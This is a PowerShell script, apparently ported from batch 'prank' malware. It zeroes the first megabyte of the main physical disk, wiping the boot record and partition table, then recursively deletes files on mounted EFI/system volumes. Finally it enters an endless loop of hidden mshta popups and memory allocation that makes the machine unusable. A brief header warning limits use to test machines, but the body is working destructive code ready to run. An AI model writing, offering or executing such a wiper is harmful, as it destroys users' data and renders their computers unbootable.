# WARNING: This script is extremely destructive. It will attempt to wipe your main physical drive (\\.\PhysicalDrive0),
# delete files on mounted EFI/system volumes, and then spam popups + consume resources until the system becomes unusable.
# Run only at your own risk, on a test machine you don't care about. Requires Administrator privileges.

Write-Host "WARNING: Diabetes incoming!!!!!!!!!" -ForegroundColor Red

# Create a small zero-filled file (512 bytes)
$zeroFile = "zero.bin"
[byte[]]$zeros = 0..0   # Just a single zero byte repeated (effectively all zeros)
Set-Content -Path $zeroFile -Value $zeros -Encoding Byte -Force

# Overwrite the beginning of PhysicalDrive0 with zeros (dangerous - targets the raw disk)
try {
    $d = [System.IO.File]::OpenWrite('\\.\PhysicalDrive0')
    $z = [System.IO.File]::OpenRead($zeroFile)
    $z.CopyTo($d)
    $d.Close()
    $z.Close()
    Write-Host "Overwrote start of PhysicalDrive0 with zeros."
} catch {
    Write-Host "Failed to overwrite drive (may need admin rights or drive locked): $_" -ForegroundColor Yellow
}

Remove-Item $zeroFile -Force -ErrorAction SilentlyContinue

# Write 1MB of zeros directly to the start of PhysicalDrive0
try {
    $d = [System.IO.File]::OpenWrite('\\.\PhysicalDrive0')
    $buffer = New-Object byte[] 1048576   # 1MB
    $d.Write($buffer, 0, $buffer.Length)
    $d.Close()
    Write-Host "Wrote 1MB of zeros to PhysicalDrive0."
} catch {
    Write-Host "Failed to write large zero block: $_" -ForegroundColor Yellow
}

# Mount and nuke common EFI/system volumes (S:, Y:, X: - these are often the EFI partition when mounted)
function Wipe-MountedVolume {
    param([string]$Letter)
    $drive = "$Letter`:"
    try {
        mountvol $drive /s 2>$null
        if (Test-Path $drive) {
            Write-Host "Wiping $drive ..."
            Get-ChildItem "$drive\*" -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
        }
    } catch { }
}

Wipe-MountedVolume "S"
Wipe-MountedVolume "Y"
Wipe-MountedVolume "X"

# Visual annoyance loop (popups + self-replicating resource consumption)
# Note: The original %0|%0 is a crude fork bomb. In PowerShell we use a tight loop + Start-Process for similar effect.

Write-Host "Entering visual chaos mode..." -ForegroundColor Red

while ($true) {
    # Spam annoying popups (repeating the same messages as original)
    Start-Process mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Still using this computer?', 0, 'Error', 16);close()" -WindowStyle Hidden
    Start-Process mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('llisT gnisU sihT retupmoC?', 0, 'Error', 16);close()" -WindowStyle Hidden
    Start-Process mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Oranges are way better you silly tomato', 0, 'Error', 16);close()" -WindowStyle Hidden

    # Consume memory/resources (simple way to mimic fork-bomb pressure without instant crash)
    $null = New-Object byte[] (1MB)   # Allocate ~1MB per iteration
    Start-Sleep -Milliseconds 50     # Adjust for intensity (lower = more aggressive)
}